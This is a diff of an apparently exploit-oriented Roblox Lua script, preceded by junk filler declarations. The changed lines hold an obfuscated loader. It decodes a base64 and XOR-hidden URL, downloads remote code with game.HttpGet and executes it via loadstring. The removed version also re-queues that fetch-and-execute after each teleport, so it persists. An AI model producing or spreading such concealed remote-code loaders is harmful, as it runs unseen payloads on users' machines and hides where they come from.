@@ -31,33 +31,4 @@ local ___=0;                              local ____=tru      local _=false;    
 local _=nil;                              local __=false      local ___=nil;local ____=nillocal _=true;                     local __=0;   local ___=0;  local ____=tru
 local _=false;                            local __=nil;       local ___=truelocal ____=0; local _=nil;                      local __=falselocal ___=nil;local ____=nil
 
-local e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"local f={0x4C,0x55,0x41,0x52,0x4F,0x43,0x4B,0x53}local function g(h)local i=h:gsub("[^"..e.."=]","")while#i%4~=0 do i=i.."="end;local j={}for k=1,#i,4 do local l=(e:find(i:sub(k,k),1,true)or 1)-1;local m=(e:find(i:sub(k+1,k+1),1,true)or 1)-1;local n,o=i:sub(k+2,k+2),i:sub(k+3,k+3)local p=n~="="and(e:find(n,1,true)or 1)-1 or 0;local q=o~="="and(e:find(o,1,true)or 1)-1 or 0;local r=l*0x40000+m*0x1000+p*0x40+q;j[#j+1]=string.char(math.floor(r/0x10000)%0x100)if n~="="then j[#j+1]=string.char(math.floor(r/0x100)%0x100)end;if o~="="then j[#j+1]=string.char(r%0x100)end end;local s=table.concat(j)local t={}for k=1,#s do t[k]=string.char(bit32.bxor(string.byte(s,k),f[(k-1)%#f+1]))end;return table.concat(t)end;local function u(i)local v=0x811C9DC5;for k=1,#i do v=bit32.band(bit32.bxor(v,string.byte(i,k))*0x01000193,0xFFFFFFFF)end;return v end;local w=g("JCE1Ijx5ZHw+NDZ8KCo/Ozk3NCEqMSg8IiEkPDttKDwheiszJCZ6YH5gbjAqNz82Png0PCY1LiE/NC1/JzYpfD4wJyFgKy4yKCZuPy4qJXw=")local x={[7709344486]=g("PzYzOz83OHw8JyghIC0nOiowbz46Ig==")}local function y(z)local A=0;repeat A=A+1;local B,s=pcall(game.HttpGet,game,z,true)if B and type(s)=="string"and#s>0 then return s end;task.wait(1.5*A)until A>=5;warn("[SS] fetch failed: "..z)end;local function C(D)local E,F=loadstring(D)if not E then warn("[SS] parse: "..tostring(F))return end;local B,G=pcall(E)if not B then warn("[SS] exec: "..tostring(G))end end;local function H(z)if not queue_on_teleport then return end;queue_on_teleport(([[
-		if not game:IsLoaded()then game.Loaded:Wait()end
-		task.wait(0.5)
-		local function dec(e,B,K)
-			B=B or"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-			K=K or{0x4C,0x55,0x41,0x52,0x4F,0x43,0x4B,0x53}
-			e=e:gsub("[^"..B.."=]","")
-			while #e%%4~=0 do e=e.."=" end
-			local o={}
-			for i=1,#e,4 do
-				o[#o+1]=string.char(math.floor((((B:find(e:sub(i,i),1,true)or 1)-1)*0x40000+(( B:find(e:sub(i+1,i+1),1,true)or 1)-1)*0x1000+(e:sub(i+2,i+2)~="="and((B:find(e:sub(i+2,i+2),1,true)or 1)-1)or 0)*0x40+(e:sub(i+3,i+3)~="="and((B:find(e:sub(i+3,i+3),1,true)or 1)-1)or 0))/0x10000)%%0x100)
-				if e:sub(i+2,i+2)~="="then o[#o+1]=string.char(math.floor((((B:find(e:sub(i,i),1,true)or 1)-1)*0x40000+((B:find(e:sub(i+1,i+1),1,true)or 1)-1)*0x1000+(e:sub(i+2,i+2)~="="and((B:find(e:sub(i+2,i+2),1,true)or 1)-1)or 0)*0x40+(e:sub(i+3,i+3)~="="and((B:find(e:sub(i+3,i+3),1,true)or 1)-1)or 0))/0x100)%%0x100)end
-				if e:sub(i+3,i+3)~="="then o[#o+1]=string.char((((B:find(e:sub(i,i),1,true)or 1)-1)*0x40000+((B:find(e:sub(i+1,i+1),1,true)or 1)-1)*0x1000+(e:sub(i+2,i+2)~="="and((B:find(e:sub(i+2,i+2),1,true)or 1)-1)or 0)*0x40+(e:sub(i+3,i+3)~="="and((B:find(e:sub(i+3,i+3),1,true)or 1)-1)or 0))%%0x100)end
-			end
-			local r,x=table.concat(o),{}
-			for i=1,#r do x[i]=string.char(bit32.bxor(string.byte(r,i),K[(i-1)%%#K+1]))end
-			return table.concat(x)
-		end
-		local t=0
-		repeat
-			t=t+1
-			local ok,r=pcall(game.HttpGet,game,%q,true)
-			if ok and type(r)=="string"and #r>0 then
-				local fn=loadstring(r)
-				if fn then pcall(fn)end
-				return
-			end
-			task.wait(1.5*t)
-		until t>=5
-	]]):format(z))end;task.spawn(function()local I=x[game.GameId]if not I then warn("[SS] no entry for game "..game.GameId)return end;local z=w..I;local D=y(z)if not D then return end;C(D)H(z)end)
+local a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"local b={0x4C,0x55,0x41,0x52,0x4F,0x43,0x4B,0x53}local function c(d)local e=d:gsub("[^"..a.."=]","")while#e%4~=0 do e=e.."="end;local f={}for g=1,#e,4 do local h=(a:find(e:sub(g,g),1,true)or 1)-1;local i=(a:find(e:sub(g+1,g+1),1,true)or 1)-1;local j,k=e:sub(g+2,g+2),e:sub(g+3,g+3)local l=j~="="and(a:find(j,1,true)or 1)-1 or 0;local m=k~="="and(a:find(k,1,true)or 1)-1 or 0;local n=h*0x40000+i*0x1000+l*0x40+m;f[#f+1]=string.char(math.floor(n/0x10000)%0x100)if j~="="then f[#f+1]=string.char(math.floor(n/0x100)%0x100)end;if k~="="then f[#f+1]=string.char(n%0x100)end end;local o=table.concat(f)local p={}for g=1,#o do p[g]=string.char(bit32.bxor(string.byte(o,g),b[(g-1)%#b+1]))end;return table.concat(p)end;local q=c("JCE1Ijx5ZHw+NDZ8KCo/Ozk3NCEqMSg8IiEkPDttKDwheiszJCZ6YH5gbjAqNz82Png0PCY1LiE/NC1/JzYpfD4wJyFgKy4yKCZuPy4qJXw=")local r={[7709344486]=c("PzYzOz83OHw8JyghIC0nOiowbz46Ig==")}task.spawn(function()local s=r[game.GameId]if not s then warn("[SS] no entry for "..game.GameId)return end;local t=0;repeat t=t+1;local u,o=pcall(game.HttpGet,game,q..s,true)if u and type(o)=="string"and#o>0 then local v,w=loadstring(o)if not v then warn("[SS] parse: "..tostring(w))return end;local x,y=pcall(v)if not x then warn("[SS] exec: "..tostring(y))end;return end;task.wait(1.5*t)until t>=5;warn("[SS] fetch failed")end)
